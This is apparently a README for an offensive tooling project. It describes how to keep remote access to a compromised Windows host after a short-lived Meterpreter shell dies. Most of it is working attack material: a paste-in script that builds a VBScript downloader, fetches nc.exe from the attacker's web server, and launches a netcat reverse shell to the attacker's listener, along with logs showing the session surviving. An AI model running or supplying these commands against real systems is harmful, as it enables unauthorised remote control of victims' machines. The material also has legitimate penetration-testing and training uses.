# WindowsMeterpreterSessionDied
Some exploits are unstable in nature and only allow for a very short shell command window. Often times the reason the shell dies after only 30 secs is because underlying Windows OS doesnt recieve the confirmation of the started service. 
One way to get around this 30 second reverse shell limitation is to create a child process in the parent process. After the parent reverse shell process dies the child process will live on.
These scripts can help extend your remote shell session by quickly spawning a new reverse shell in a child process or new thread.
The txt files in this project with the word "Thread" in them spawn a new thread in a new CMD window.
This solution can be leveraged on any reverse shell that dies prematurely (Metepreter, NC, NCat etc) as the commands can be easily copied and pasted in a single action. 

NOTE:  Sometimes the reverse shell line will run before the NC.exe file has fully downloaded, just try running the nc.exe command again or waiting until running the final command until the nc.exe file has fully downloaded.

Here is an example of a Metepreter Exploit with a short lived reverse shell:

~~~~
[*] Started reverse TCP handler on 10.11.0.60:4444 
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (179267 bytes) to 1.1.1.2
[*] Meterpreter session 1 opened (1.1.1.2:4444 -> 1.1.1.1:1996) at 2018-03-02 17:06:07 -0700

meterpreter > shell
Process 2960 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>cd\usrs
cd\usrs
The system cannot find the path specified.

C:\WINDOWS\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8123B-EF81

 Directory of C:\

12/24/2009  05:03 AM                 0 AUTOEXEC.BAT
12/24/2009  05:03 AM                 0 CONFIG.SYS
09/19/2011  08:26 AM    <DIR>          Documents and Settings
04/20/2016  08:25 PM    <DIR>          WINDOWS
12/24/2009  05:04 AM    <DIR>          wmpub
               2 File(s)              0 bytes
               3 Dir(s)   5,666,758,656 bytes free

C:\>cd 
[*] 1.1.1.1 - Meterpreter session 1 closed.  Reason: Died
~~~~

How do we spawn a new reverse shell and extend our command session?

This solution uses Netcat for Windows to create the second shell session.
You will need to have the nc.exe file stored in a folder on your Kali Linux machine and then you can create a simple python web server to serve it up:
`python -m SimpleHTTPServer 80`

~~~~
root@kali:~/Documents/WindowsPRIVZ# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
1.1.1.1 - - [03/Mar/2018 08:29:24] "GET /nc.exe HTTP/1.0" 200 -
~~~~

Next you will want to create your local netcat listener.  I like to use port 443 just in case there are some firewall rules at play on the target machine.
`nc -nlvp 443`

~~~~
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
~~~~

Finally, you will want to select the correct script for the target OS and doctor it to use the correct IP Address for your kali machine.
Edit lines 19 and 21 and replace 1.1.1.1 with the IP Address of your Kali Linux machine.

Now kick off a new short lived reverse shell and once you are at the command prompt copy and paste the entire script (all the lines at once) into the shell.

~~~~
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (179267 bytes) to 1.1.1.2
[*] Meterpreter session 7 opened (1.1.1.1:4444 -> 1.1.1.2:1031) at 2018-03-03 09:17:07 -0700

meterpreter > shell
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>cd\Documents and Settings\All Users\Documents\
timeout 1
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs
timeout 1
echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs
timeout 1
echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs
timeout 1
echo xHttp.Send >> dl.vbs
timeout 1
echo bStrm.type = 1 >> dl.vbs
timeout 1
echo bStrm.open >> dl.vbs
timeout 1
echo bStrm.write xHttp.responseBody >> dl.vbs
timeout 1
echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
timeout 1
dl.vbs "http://1.1.1.1/nc.exe" "c:\Documents and Settings\All Users\Documents\nc.exe"
timeout 1
nc.exe -nv 1.1.1.1 443 -e cmd.exe
cd\Documents and Settings\All Users\Documents\

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo xHttp.Send >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo bStrm.type = 1 >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo bStrm.open >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo bStrm.write xHttp.responseBody >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>dl.vbs "http://1.1.1.1/nc.exe" "c:\Documents and Settings\All Users\Documents\nc.exe"

C:\Documents and Settings\All Users\Documents>timeout 1
ERROR: Input redirection is not supported, exiting the process immediately.

C:\Documents and Settings\All Users\Documents>nc.exe -nv 1.1.1.1 443 -e cmd.exe
nc.exe -nv 1.1.1.1 443 -e cmd.exe
(UNKNOWN) [1.1.1.1] 443 (?) open

[*] 1.1.1.2 - Meterpreter session 7 closed.  Reason: Die

~~~~

Although the Metepreter sessions has terminated or timed out, we still have our new remote session running in the background!

~~~~
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [1.1.1.1] from (UNKNOWN) [1.1.1.2] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.


C:\Documents and Settings\All Users\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 801B-EF81

 Directory of C:\Documents and Settings\All Users\Documents

03/03/2018  08:17 AM    <DIR>          .
03/03/2018  08:17 AM    <DIR>          ..
03/03/2018  08:17 AM               283 dl.vbs
12/24/2009  05:02 AM    <DIR>          My Music
03/03/2018  08:17 AM            38,616 nc.exe
               2 File(s)         38,899 bytes
               3 Dir(s)   5,666,869,248 bytes free

C:\Documents and Settings\All Users\Documents>
~~~~

